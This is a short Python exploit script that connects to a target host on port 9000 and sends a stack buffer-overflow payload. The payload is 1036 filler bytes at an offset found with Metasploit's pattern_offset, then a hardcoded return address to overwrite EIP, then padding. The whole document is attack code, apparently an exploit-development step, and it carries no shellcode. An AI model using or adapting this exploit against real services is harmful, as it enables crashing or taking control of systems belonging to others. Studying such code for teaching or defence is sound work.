#!/usr/bin/python

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 9000))

# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 69423569
# [*] Exact match at offset 1036
# Here 69423569 is the value at EIP
buffer = "A" * 1036

# This should overwrite the return address
buffer += "\x64\xF7\x22\x00"

buffer += "C" * 2000

sock.send(buffer)

sock.close()
